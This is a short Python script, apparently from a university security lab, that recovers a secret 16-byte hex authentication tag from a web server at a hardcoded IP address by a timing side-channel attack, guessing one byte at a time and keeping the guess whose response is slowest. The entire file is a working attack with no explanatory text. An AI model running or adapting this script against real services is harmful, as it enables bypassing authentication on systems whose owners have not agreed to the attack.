import requests

def buildTag(tags):
    resultTag = ""
    for tag in tags:
        resultTag += tag
    return resultTag

def testTag(tag):
    totUrl = url + tag
    result = requests.get(totUrl).elapsed.total_seconds()
    print("The Time :" + str(result) + " for tag : " + tag)
    return result

delay = "999"
delayInt = 0.999
user = "joarkarl100"
url = "http://130.243.27.198/auth/" + delay + "/" + user + "/"


tags = ["00" for x in range(16)]


for x in range(16):
    found = 0
    for i in range(0,16):
        for j in range(0,16):
            if found == 0:
                partOfTag = (hex(i)[2] + hex(j)[2])
                tags[x] = partOfTag
                thisTime = testTag(buildTag(tags))

                if thisTime > (delayInt * (x + 1)):
                    #Testa igen för att säkertställa att den är rätt

                    print ("Found " + partOfTag + " as index " + str(x) + " of tag")
                    found = 1

print("    ")        
print(buildTag(tags))
print("done 😀")